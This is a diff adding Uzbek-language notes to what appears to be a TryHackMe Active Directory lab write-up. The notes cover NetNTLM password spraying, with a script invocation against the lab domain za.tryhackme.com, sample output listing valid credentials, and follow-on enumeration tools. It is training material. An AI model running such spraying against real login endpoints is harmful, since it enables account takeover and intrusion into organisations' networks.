@@ -103,3 +103,65 @@ def password_spray(self, password, url):
   * Keraksiz internetga ochiq xizmatlarni **yopish yoki cheklash** kerak.
   * Kerakli joylarda **MFA (multi-factor authentication)** joriy etilishi kerak.
 
+
+### 🔐 **Parolni Purkash (Password Spraying)**
+
+Agar siz **AttackBox** dan foydalanayotgan bo‘lsangiz, **parolni purkash (password spraying)** script fayli va username ro‘yxati fayli quyidagi papkada joylashgan bo‘ladi:
+
+```
+/root/Rooms/BreachingAD/task3/
+```
+
+### 🖥 Skriptni ishga tushirish:
+
+Quyidagi buyruq orqali skriptni ishga tushiramiz:
+
+```bash
+python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>
+```
+
+#### Parametrlarning ma’nosi:
+
+| Parametr      | Tavsif                                                                                                   |
+| ------------- | -------------------------------------------------------------------------------------------------------- |
+| `<userfile>`  | Username’lar ro‘yxati yozilgan fayl. Misol: `usernames.txt`                                              |
+| `<fqdn>`      | Tashkilotga tegishli to‘liq domen nomi. Misol: `za.tryhackme.com`                                        |
+| `<password>`  | Hujumda sinaladigan yagona parol. Misol: `Changeme123`                                                   |
+| `<attackurl>` | Windows Authentication’ni qo‘llab-quvvatlaydigan sayt manzili. Misol: `http://ntlmauth.za.tryhackme.com` |
+
+### 🧪 Misol hujum:
+
+Quyidagi buyruq ishlatilgan:
+
+```bash
+python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
+```
+
+Natijada chiqadigan loglar:
+
+```
+[*] Starting passwords spray attack using the following password: Changeme123
+[-] Failed login with Username: anthony.reynolds
+[-] Failed login with Username: henry.taylor
+[...]
+[+] Valid credential pair found! Username: [...] Password: Changeme123
+[-] Failed login with Username: louise.talbot
+[*] Password spray attack completed, [X] valid credential pairs found
+```
+
+### ✅ **Natija:**
+
+Bu hujum orqali siz **OSINT (tashqi kuzatuv orqali olingan ma’lumotlar)** va **NetNTLM asosidagi Password Spraying** texnikasidan foydalanib:
+
+* Bir necha foydalanuvchi nomlariga bitta parolni urinasiz.
+* Shundan keyin bir nechta **to‘g‘ri login-parol** juftligini qo‘lga kiritishingiz mumkin.
+
+Bu login ma’lumotlari sizga keyinchalik **Active Directory’ni ichkaridan tahlil qilish** (enumeration) uchun kerak bo‘ladi — masalan, kim qanday rolga ega, qanday kompyuterlar bor, qanday xizmatlar ishlatilmoqda va hokazo.
+
+---
+
+### 🧠 **Esda tuting:**
+
+* Password spraying — bu **"har bir foydalanuvchiga bitta parol"** usulidir.
+* Bu hujumdan so‘ng siz haqiqiy AD foydalanuvchisining login va parolini bilib olgan bo‘lasiz.
+* Endi siz **kerakli asboblar (BloodHound, CrackMapExec, PowerView)** orqali AD’ni ichkaridan o‘rganishingiz mumkin.
